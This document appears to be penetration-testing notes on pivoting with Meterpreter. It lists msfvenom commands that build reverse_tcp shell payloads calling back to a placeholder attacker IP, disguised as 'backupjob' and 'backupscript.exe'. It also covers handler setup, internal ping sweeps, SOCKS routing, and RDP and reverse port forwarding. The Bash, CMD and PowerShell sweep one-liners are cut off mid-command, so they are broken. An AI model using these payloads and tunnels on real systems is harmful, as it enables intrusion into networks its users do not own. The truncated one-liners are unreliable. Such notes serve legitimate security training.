# Meterpreter Tunneling & Port Forwarding

## 1. Establishing a Meterpreter Pivot

**Context:** Use when you have initial access to a pivot host (e.g., Ubuntu server) and want to leverage Meterpreter’s built-in post-exploitation and pivoting features instead of standard SSH forwarding.

### Operational Workflow

1. **Generate Payload:** Create a Linux executable for the pivot host.
2. **Configure Handler:** Set up a listener on the attack machine to receive the connection.
3. **Execute:** Transfer the binary to the pivot host, grant execution permissions, and run it.

|Tool|Command|Description|
|:--|:--|:--|
|**msfvenom**|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACK_IP> -f elf -o backupjob LPORT=<PORT>`|Creates the Meterpreter binary.|
|**Metasploit**|`use exploit/multi/handler`|Selects the generic payload handler.|
|**Metasploit**|`set payload linux/x64/meterpreter/reverse_tcp`|Matches the payload to the generated binary.|
|**Pivot Host**|`chmod +x backupjob && ./backupjob`|Makes the payload executable and runs it.|

---

## 2. Internal Network Enumeration

**Context:** Once a session is established, identify active hosts on the internal subnet (e.g., `<TARGET_SUBNET>`).

### Techniques

- **Meterpreter Ping Sweep:** Generates ICMP traffic directly from the pivot host.
- **Native One-Liners:** Useful if Meterpreter modules are restricted or for quick manual checks.

| Environment       | Command                                                              |
| :---------------- | :------------------------------------------------------------------- |
| **Meterpreter**   | `run post/multi/gather/ping_sweep RHOSTS=<TARGET_SUBNET>`            |
| **Linux (Bash)**  | `for i in {1..254} ;do (ping -c 1 <TARGET_IP_PREFIX>.$i \|           |
| **Windows (CMD)** | `for /L %i in (1 1 254) do ping <TARGET_IP_PREFIX>.%i -n 1 -w 100 \| |
| **PowerShell**    | `1..254 \|                                                           |

**Note on Reliability:** Ping sweeps may fail on the first attempt due to ARP cache building. **Always run the sweep at least twice** to ensure the cache is populated.

---

## 3. SOCKS Proxy & Routing

**Context:** Use when ICMP is blocked by firewalls or when you need to use external tools (like **Nmap**) to scan the internal network through the Meterpreter session.

### Operational Workflow

1. **Start SOCKS Proxy:** Establish a local listener on the attack machine.
2. **Configure Proxychains:** Edit `/etc/proxychains.conf` to point to the local SOCKS listener.
3. **Configure Routing:** Tell Metasploit to route traffic for the internal subnet through the specific Meterpreter session.

|Step|Command / Setting|Location|
|:--|:--|:--|
|**Start Proxy**|`use auxiliary/server/socks_proxy`|Metasploit|
|**Set Version**|`set version 4a`|Metasploit|
|**Proxychains Config**|`socks4 127.0.0.1 9050`|`/etc/proxychains.conf`|
|**AutoRoute**|`run post/multi/manage/autoroute -s <TARGET_SUBNET>`|Meterpreter/MSF|
|**Verify Routes**|`run autoroute -p`|Meterpreter|

**Attack Implication:** This unlocks the ability to run any TCP-based tool through the pivot using `proxychains <TOOL> <ARGS>`.

---

## 4. Local Port Forwarding

**Context:** Use to bridge a specific port on the internal target to a port on your local attack machine. This is ideal for accessing single services like **RDP** or **SMB**.

### Command Reference

`portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>`

### Example Scenario (RDP Access)

1. **Forward Port:** `portfwd add -l 3300 -p 3389 -r <TARGET_IP>`.
2. **Connect:** Use a local client to connect to the bridged port: `xfreerdp /v:localhost:3300 /u:<USERNAME> /p:<PASSWORD>`.
3. **Verify:** Use `netstat -antp` on the attack host to confirm the established session.

---

## 5. Reverse Port Forwarding

**Context:** Use when you need the pivot host to listen for incoming connections (like a reverse shell from an internal target) and forward them back to your attack machine.

### Operational Workflow

1. **Setup Reverse Forward:** Configure the pivot host to listen on a port and forward traffic to your attack host.
2. **Start Handler:** Set up a listener on your attack machine for the incoming shell.
3. **Generate Target Payload:** Create a payload for the internal target that points to the **Pivot Host**.

|Action|Command|
|:--|:--|
|**Add Reverse Forward**|`portfwd add -R -l <ATTACK_PORT> -p <PIVOT_PORT> -L <ATTACK_IP>`|
|**Generate Payload**|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT_IP> LPORT=<PIVOT_PORT> -f exe -o backupscript.exe`|

**Attack Implication:** When executed on the internal target, the shell hits the pivot host, which forwards it through the established tunnel back to your attack machine.